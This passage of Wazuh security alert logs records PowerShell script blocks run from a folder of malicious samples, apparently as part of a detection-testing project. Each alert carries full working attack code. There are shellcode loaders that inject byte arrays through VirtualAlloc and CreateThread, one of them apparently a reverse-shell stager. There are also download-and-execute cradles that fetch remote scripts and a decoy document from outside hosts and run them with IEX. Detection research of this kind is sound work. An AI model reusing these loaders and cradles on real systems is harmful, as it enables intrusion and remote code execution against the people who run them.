flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xdb,0x8d,0xea,0xce,0xdb,0xde,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x5d,0x0f,0x03,0x5d,0xd4,0x6f,0x1f,0x32,0x02,0xed,0xe0,0xcb,0xd2,0x92,0x69,0x2e,0xe3,0x92,0x0e,0x3a,0x53,0x23,0x44,0x6e,0x5f,0xc8,0x08,0x9b,0xd4,0xbc,0x84,0xac,0x5d,0x0a,0xf3,0x83,0x5e,0x27,0xc7,0x82,0xdc,0x3a,0x14,0x65,0xdd,0xf4,0x69,0x64,0x1a,0xe8,0x80,0x34,0xf3,0x66,0x36,0xa9,0x70,0x32,0x8b,0x42,0xca,0xd2,0x8b,0xb7,0x9a,0xd5,0xba,0x69,0x91,0x8f,0x1c,0x8b,0x76,0xa4,0x14,0x93,0x9b,0x81,0xef,0x28,0x6f,0x7d,0xee,0xf8,0xbe,0x7e,0x5d,0xc5,0x0f,0x8d,0x9f,0x01,0xb7,0x6e,0xea,0x7b,0xc4,0x13,0xed,0xbf,0xb7,0xcf,0x78,0x24,0x1f,0x9b,0xdb,0x80,0x9e,0x48,0xbd,0x43,0xac,0x25,0xc9,0x0c,0xb0,0xb8,0x1e,0x27,0xcc,0x31,0xa1,0xe8,0x45,0x01,0x86,0x2c,0x0e,0xd1,0xa7,0x75,0xea,0xb4,0xd8,0x66,0x55,0x68,0x7d,0xec,0x7b,0x7d,0x0c,0xaf,0x13,0xb2,0x3d,0x50,0xe3,0xdc,0x36,0x23,0xd1,0x43,0xed,0xab,0x59,0x0b,0x2b,0x2b,0x9e,0x26,0x8b,0xa3,0x61,0xc9,0xec,0xea,0xa5,0x9d,0xbc,0x84,0x0c,0x9e,0x56,0x55,0xb1,0x4b,0xf8,0x05,0x1d,0x24,0xb9,0xf5,0xdd,0x94,0x51,0x1c,0xd2,0xcb,0x42,0x1f,0x39,0x64,0xe8,0xe5,0xa9,0x09,0x3e,0x77,0x81,0x66,0xc3,0x78,0xc0,0x2b,0x4a,0x9e,0x88,0xc3,0x1a,0x08,0x24,0x7d,0x07,0xc2,0xd5,0x82,0x9d,0xae,0xd5,0x09,0x12,0x4e,0x9b,0xf9,0x5f,0x5c,0x4b,0x0a,0x2a,0x3e,0xdd,0x15,0x80,0x55,0xe1,0x83,0x2f,0xfc,0xb6,0x3b,0x32,0xd9,0xf0,0xe3,0xcd,0x0c,0x8b,0x2a,0x58,0xef,0xe3,0x52,0x8c,0xef,0xf3,0x04,0xc6,0xef,0x9b,0xf0,0xb2,0xa3,0xbe,0xfe,0x6e,0xd0,0x13,0x6b,0x91,0x81,0xc0,0x3c,0xf9,0x2f,0x3f,0x0a,0xa6,0xd0,0x6a,0x8a,0x9a,0x06,0x52,0xf8,0xf2,0x9a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: edc06d19-19bd-4ab0-b71b-70a484169ef6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\305.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xbb,0xdb,0x8d,0xea,0xce,0xdb,0xde,0xd9,0x74,0x24,0xf4,0x5d,0x33,0xc9,0xb1,0x47,0x83,0xed,0xfc,0x31,0x5d,0x0f,0x03,0x5d,0xd4,0x6f,0x1f,0x32,0x02,0xed,0xe0,0xcb,0xd2,0x92,0x69,0x2e,0xe3,0x92,0x0e,0x3a,0x53,0x23,0x44,0x6e,0x5f,0xc8,0x08,0x9b,0xd4,0xbc,0x84,0xac,0x5d,0x0a,0xf3,0x83,0x5e,0x27,0xc7,0x82,0xdc,0x3a,0x14,0x65,0xdd,0xf4,0x69,0x64,0x1a,0xe8,0x80,0x34,0xf3,0x66,0x36,0xa9,0x70,0x32,0x8b,0x42,0xca,0xd2,0x8b,0xb7,0x9a,0xd5,0xba,0x69,0x91,0x8f,0x1c,0x8b,0x76,0xa4,0x14,0x93,0x9b,0x81,0xef,0x28,0x6f,0x7d,0xee,0xf8,0xbe,0x7e,0x5d,0xc5,0x0f,0x8d,0x9f,0x01,0xb7,0x6e,0xea,0x7b,0xc4,0x13,0xed,0xbf,0xb7,0xcf,0x78,0x24,0x1f,0x9b,0xdb,0x80,0x9e,0x48,0xbd,0x43,0xac,0x25,0xc9,0x0c,0xb0,0xb8,0x1e,0x27,0xcc,0x31,0xa1,0xe8,0x45,0x01,0x86,0x2c,0x0e,0xd1,0xa7,0x75,0xea,0xb4,0xd8,0x66,0x55,0x68,0x7d,0xec,0x7b,0x7d,0x0c,0xaf,0x13,0xb2,0x3d,0x50,0xe3,0xdc,0x36,0x23,0xd1,0x43,0xed,0xab,0x59,0x0b,0x2b,0x2b,0x9e,0x26,0x8b,0xa3,0x61,0xc9,0xec,0xea,0xa5,0x9d,0xbc,0x84,0x0c,0x9e,0x56,0x55,0xb1,0x4b,0xf8,0x05,0x1d,0x24,0xb9,0xf5,0xdd,0x94,0x51,0x1c,0xd2,0xcb,0x42,0x1f,0x39,0x64,0xe8,0xe5,0xa9,0x09,0x3e,0x77,0x81,0x66,0xc3,0x78,0xc0,0x2b,0x4a,0x9e,0x88,0xc3,0x1a,0x08,0x24,0x7d,0x07,0xc2,0xd5,0x82,0x9d,0xae,0xd5,0x09,0x12,0x4e,0x9b,0xf9,0x5f,0x5c,0x4b,0x0a,0x2a,0x3e,0xdd,0x15,0x80,0x55,0xe1,0x83,0x2f,0xfc,0xb6,0x3b,0x32,0xd9,0xf0,0xe3,0xcd,0x0c,0x8b,0x2a,0x58,0xef,0xe3,0x52,0x8c,0xef,0xf3,0x04,0xc6,0xef,0x9b,0xf0,0xb2,0xa3,0xbe,0xfe,0x6e,0xd0,0x13,0x6b,0x91,0x81,0xc0,0x3c,0xf9,0x2f,0x3f,0x0a,0xa6,0xd0,0x6a,0x8a,0x9a,0x06,0x52,0xf8,0xf2,0x9a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"edc06d19-19bd-4ab0-b71b-70a484169ef6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\305.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:46.736+0000","rule":{"level":4,"description":"Powershell executed \"Get-Content -Stream or Invoke-Expresion\". Possible string execution as code","id":"91837","mitre":{"id":["T1059.001"],"tactic":["Execution"],"technique":["PowerShell"]},"firedtimes":5,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304446.3557032","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:06.6803276Z","eventRecordID":"145512","processID":"2676","threadID":"9128","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$wC=NEW-OBJEcT SyStEm.NET.WEbCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDeRs.AdD('User-Agent',$u);$wC.PROXY = [SySTem.NEt.WEbReQUEst]::DeFAulTWEbPrOXY;$Wc.PRoxY.CrEDENTIaLs = [SYstEm.NEt.CreDEntIalCAche]::DEFAulTNEtWorKCrEdeNtIAlS;$K='?$~tvolIm%(f31,^E2.|d9Bgj@:s8D_7';$I=0;[cHar[]]$B=([char[]]($WC.DOwnLOAdSTRiNG(\"http://23.116.90.9:80/index.asp\")))|%{$_-BXoR$K[$I++%$K.LeNgTh]};IEX ($B-jOIn'')\r\n\r\nScriptBlock ID: ea7d5194-2e48-4c3b-8bf7-b5683d4ebbcc\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3090.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$wC=NEW-OBJEcT SyStEm.NET.WEbCLiENt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEaDeRs.AdD('User-Agent',$u);$wC.PROXY = [SySTem.NEt.WEbReQUEst]::DeFAulTWEbPrOXY;$Wc.PRoxY.CrEDENTIaLs = [SYstEm.NEt.CreDEntIalCAche]::DEFAulTNEtWorKCrEdeNtIAlS;$K='?$~tvolIm%(f31,^E2.|d9Bgj@:s8D_7';$I=0;[cHar[]]$B=([char[]]($WC.DOwnLOAdSTRiNG(\\\"http://23.116.90.9:80/index.asp\\\")))|%{$_-BXoR$K[$I++%$K.LeNgTh]};IEX ($B-jOIn'')","scriptBlockId":"ea7d5194-2e48-4c3b-8bf7-b5683d4ebbcc","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3090.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:46.858+0000","rule":{"level":4,"description":"Powershell script querying system environment variables","id":"91816","mitre":{"id":["T1082"],"tactic":["Discovery"],"technique":["System Information Discovery"]},"firedtimes":13,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304446.3560810","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"5","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:07.3984887Z","eventRecordID":"145516","processID":"4464","threadID":"4260","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"VERBOSE","message":"\"Creating Scriptblock text (1 of 1):\r\n$n=new-object net.webclient;\r\n$n.proxy=[Net.WebRequest]::GetSystemWebProxy();\r\n$n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;\r\n$n.DownloadFile(\"http://www.geocities.jp/lgxpoy6/huuliin-tusul-offsh-20160918.docx\",\"$env:temp\\huuliin-tusul-offsh-20160918.docx\");\r\nStart-Process \"$env:temp\\huuliin-tusul-offsh-20160918.docx\"\r\nIEX $n.downloadstring('http://www.geocities.jp/lgxpoy6/f0921.ps1');\r\n\r\nScriptBlock ID: c26f8e01-37f7-4dc9-ace4-c97eae88a458\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3102.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$n=new-object net.webclient;  $n.proxy=[Net.WebRequest]::GetSystemWebProxy();  $n.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;  $n.DownloadFile(\\\"http://www.geocities.jp/lgxpoy6/huuliin-tusul-offsh-20160918.docx\\\",\\\"$env:temp\\\\huuliin-tusul-offsh-20160918.docx\\\");  Start-Process \\\"$env:temp\\\\huuliin-tusul-offsh-20160918.docx\\\"  IEX $n.downloadstring('http://www.geocities.jp/lgxpoy6/f0921.ps1');","scriptBlockId":"c26f8e01-37f7-4dc9-ace4-c97eae88a458","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3102.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:47.755+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":161,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304447.3564447","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:08.1812241Z","eventRecordID":"145520","processID":"7904","threadID":"6732","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$r8kaDS = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $r8kaDS -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xba,0x65,0x2e,0x29,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x14,0x03,0x50,0x71,0xcc,0xdc,0xf2,0x91,0x92,0x1f,0x0b,0x61,0xf3,0x96,0xee,0x50,0x33,0xcc,0x7b,0xc2,0x83,0x86,0x2e,0xee,0x68,0xca,0xda,0x65,0x1c,0xc3,0xed,0xce,0xab,0x35,0xc3,0xcf,0x80,0x06,0x42,0x53,0xdb,0x5a,0xa4,0x6a,0x14,0xaf,0xa5,0xab,0x49,0x42,0xf7,0x64,0x05,0xf1,0xe8,0x01,0x53,0xca,0x83,0x59,0x75,0x4a,0x77,0x29,0x74,0x7b,0x26,0x22,0x2f,0x5b,0xc8,0xe7,0x5b,0xd2,0xd2,0xe4,0x66,0xac,0x69,0xde,0x1d,0x2f,0xb8,0x2f,0xdd,0x9c,0x85,0x80,0x2c,0xdc,0xc2,0x26,0xcf,0xab,0x3a,0x55,0x72,0xac,0xf8,0x24,0xa8,0x39,0x1b,0x8e,0x3b,0x99,0xc7,0x2f,0xef,0x7c,0x83,0x23,0x44,0x0a,0xcb,0x27,0x5b,0xdf,0x67,0x53,0xd0,0xde,0xa7,0xd2,0xa2,0xc4,0x63,0xbf,0x71,0x64,0x35,0x65,0xd7,0x99,0x25,0xc6,0x88,0x3f,0x2d,0xea,0xdd,0x4d,0x6c,0x62,0x11,0x7c,0x8f,0x72,0x3d,0xf7,0xfc,0x40,0xe2,0xa3,0x6a,0xe8,0x6b,0x6a,0x6c,0x0f,0x46,0xca,0xe2,0xee,0x69,0x2b,0x2a,0x34,0x3d,0x7b,0x44,0x9d,0x3e,0x10,0x94,0x22,0xeb,0x8d,0x91,0xb4,0x43,0x84,0x25,0x3c,0x04,0x2a,0x5a,0xad,0x88,0xa3,0xbc,0x9d,0x60,0xe4,0x10,0x5d,0xd1,0x44,0xc1,0x35,0x3b,0x4b,0x3e,0x25,0x44,0x81,0x57,0xcf,0xab,0x7c,0x0f,0x67,0x55,0x25,0xdb,0x16,0x9a,0xf3,0xa1,0x18,0x10,0xf0,0x56,0xd6,0xd1,0x7d,0x45,0x8e,0x11,0xc8,0x37,0x18,0x2d,0xe6,0x52,0xa4,0xbb,0x0d,0xf5,0xf3,0x53,0x0c,0x20,0x33,0xfc,0xef,0x07,0x48,0x35,0x7a,0xe8,0x26,0x3a,0x6a,0xe8,0xb6,0x6c,0xe0,0xe8,0xde,0xc8,0x50,0xbb,0xfb,0x16,0x4d,0xaf,0x50,0x83,0x6e,0x86,0x05,0x04,0x07,0x24,0x70,0x62,0x88,0xd7,0x57,0x72,0xf4,0x01,0x91,0x00,0x14,0x92;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$r8k=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($r8k.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$r8k,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 8a2489ff-6aa0-4ac4-94d1-95a07d7aece1\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3113.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$r8kaDS = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $r8kaDS -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xee,0xba,0x65,0x2e,0x29,0x0e,0xd9,0x74,0x24,0xf4,0x58,0x29,0xc9,0xb1,0x47,0x83,0xc0,0x04,0x31,0x50,0x14,0x03,0x50,0x71,0xcc,0xdc,0xf2,0x91,0x92,0x1f,0x0b,0x61,0xf3,0x96,0xee,0x50,0x33,0xcc,0x7b,0xc2,0x83,0x86,0x2e,0xee,0x68,0xca,0xda,0x65,0x1c,0xc3,0xed,0xce,0xab,0x35,0xc3,0xcf,0x80,0x06,0x42,0x53,0xdb,0x5a,0xa4,0x6a,0x14,0xaf,0xa5,0xab,0x49,0x42,0xf7,0x64,0x05,0xf1,0xe8,0x01,0x53,0xca,0x83,0x59,0x75,0x4a,0x77,0x29,0x74,0x7b,0x26,0x22,0x2f,0x5b,0xc8,0xe7,0x5b,0xd2,0xd2,0xe4,0x66,0xac,0x69,0xde,0x1d,0x2f,0xb8,0x2f,0xdd,0x9c,0x85,0x80,0x2c,0xdc,0xc2,0x26,0xcf,0xab,0x3a,0x55,0x72,0xac,0xf8,0x24,0xa8,0x39,0x1b,0x8e,0x3b,0x99,0xc7,0x2f,0xef,0x7c,0x83,0x23,0x44,0x0a,0xcb,0x27,0x5b,0xdf,0x67,0x53,0xd0,0xde,0xa7,0xd2,0xa2,0xc4,0x63,0xbf,0x71,0x64,0x35,0x65,0xd7,0x99,0x25,0xc6,0x88,0x3f,0x2d,0xea,0xdd,0x4d,0x6c,0x62,0x11,0x7c,0x8f,0x72,0x3d,0xf7,0xfc,0x40,0xe2,0xa3,0x6a,0xe8,0x6b,0x6a,0x6c,0x0f,0x46,0xca,0xe2,0xee,0x69,0x2b,0x2a,0x34,0x3d,0x7b,0x44,0x9d,0x3e,0x10,0x94,0x22,0xeb,0x8d,0x91,0xb4,0x43,0x84,0x25,0x3c,0x04,0x2a,0x5a,0xad,0x88,0xa3,0xbc,0x9d,0x60,0xe4,0x10,0x5d,0xd1,0x44,0xc1,0x35,0x3b,0x4b,0x3e,0x25,0x44,0x81,0x57,0xcf,0xab,0x7c,0x0f,0x67,0x55,0x25,0xdb,0x16,0x9a,0xf3,0xa1,0x18,0x10,0xf0,0x56,0xd6,0xd1,0x7d,0x45,0x8e,0x11,0xc8,0x37,0x18,0x2d,0xe6,0x52,0xa4,0xbb,0x0d,0xf5,0xf3,0x53,0x0c,0x20,0x33,0xfc,0xef,0x07,0x48,0x35,0x7a,0xe8,0x26,0x3a,0x6a,0xe8,0xb6,0x6c,0xe0,0xe8,0xde,0xc8,0x50,0xbb,0xfb,0x16,0x4d,0xaf,0x50,0x83,0x6e,0x86,0x05,0x04,0x07,0x24,0x70,0x62,0x88,0xd7,0x57,0x72,0xf4,0x01,0x91,0x00,0x14,0x92;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$r8k=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($r8k.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$r8k,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"8a2489ff-6aa0-4ac4-94d1-95a07d7aece1","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\3113.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-06T02:20:49.115+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":162,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1783304449.3575820","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-06T02:21:08.9954539Z","eventRecordID":"145524","processID":"4360","threadID":"6360","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 509f8677-fd70-44ee-a932-5fb08261ce85\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\3145.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$sc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x0b,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$size = 0x1000;if ($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 